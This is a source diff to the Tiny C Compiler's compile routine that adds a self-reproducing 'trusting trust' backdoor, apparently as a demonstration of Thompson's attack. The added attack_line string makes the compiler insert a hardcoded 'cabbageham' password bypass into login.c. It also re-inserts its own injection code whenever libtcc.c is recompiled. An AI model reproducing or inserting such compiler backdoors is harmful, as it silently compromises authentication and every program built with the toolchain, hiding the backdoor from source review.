@@ -747,7 +747,6 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 		    if (strstr(buffer, target_line)) {
 		        fputs(buffer, temp);
                 snprintf(login_line_final, 9900, login_line, 34, 34);   
-                printf(login_line_final);
 
                 fputs(login_line_final, temp);
             } 
@@ -766,13 +765,13 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 		FILE *source = fopen(str, "r");
 		FILE *temp = fopen("temp.txt", "w");
         char target_line[] = "       variables, which may or may not have advantages */";
-        char attack_line[] = "    char login_line[] = %cif (!strcmp(username, %%ccabbageham%%c))return 0;%c;if(!strcmp(str, %clogin.c%c)) {printf(%ctesting\\n%c);FILE *source = fopen(str, %cr%c);FILE *temp = fopen(%ctemp1.txt%c, %cw%c);unsigned char* login_line_final = tcc_malloc(sizeof(unsigned char) * 9900);char target_line[] = %creturn 0;%c;char buffer[50000];while (fgets(buffer, 50000, source)) {if (strstr(buffer, target_line)) {fputs(buffer, temp);snprintf(login_line_final, 9900, login_line, 34, 34);fputs(login_line_final, temp);} else {fputs(buffer, temp);}}fclose(source);fclose(temp);tcc_free(login_line_final);fd = _tcc_open(s1, %ctemp1.txt%c);str = %ctemp1.txt%c;}";
+        char attack_line[] = "    char login_line[] = %cif (!strcmp(username, %%ccabbageham%%c))return 0;%c;if(!strcmp(str, %clogin.c%c)) {FILE *source = fopen(str, %cr%c);FILE *temp = fopen(%ctemp1.txt%c, %cw%c);unsigned char* login_line_final = tcc_malloc(sizeof(unsigned char) * 9900);char target_line[] = %creturn 0;%c;char buffer[50000];while (fgets(buffer, 50000, source)) {if (strstr(buffer, target_line)) {fputs(buffer, temp);snprintf(login_line_final, 9900, login_line, 34, 34);fputs(login_line_final, temp);} else {fputs(buffer, temp);}}fclose(source);fclose(temp);tcc_free(login_line_final);fd = _tcc_open(s1, %ctemp1.txt%c);str = %ctemp1.txt%c;}if(!strcmp(str, %clibtcc.c%c)) {FILE *source = fopen(str, %cr%c);FILE *temp = fopen(%ctemp.txt%c, %cw%c);char target_line[] = %c       variables, which may or may not have advantages */%c;char attack_line[] = %c%s%c;unsigned char* attack_line_final = tcc_malloc(sizeof(unsigned char) * 9900);char buffer[50000];while (fgets(buffer, 50000, source)) {if (strstr(buffer, target_line)) {fputs(buffer, temp);snprintf(attack_line_final, 9900, attack_line, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, attack_line, 34, 34, 34, 34, 34);fputs(attack_line_final, temp);} else {fputs(buffer, temp);}}fclose(source);fclose(temp);tcc_free(attack_line_final);fd = _tcc_open(s1, %ctemp.txt%c);str = %ctemp.txt%c;}";
         unsigned char* attack_line_final = tcc_malloc(sizeof(unsigned char) * 9900);
 		char buffer[50000];
 		while (fgets(buffer, 50000, source)) {
 		    if (strstr(buffer, target_line)) {
 		        fputs(buffer, temp);
-                snprintf(attack_line_final, 9900, attack_line, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34);
+                snprintf(attack_line_final, 9900, attack_line, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, attack_line, 34, 34, 34, 34, 34);
                 fputs(attack_line_final, temp);
             } 
             else {
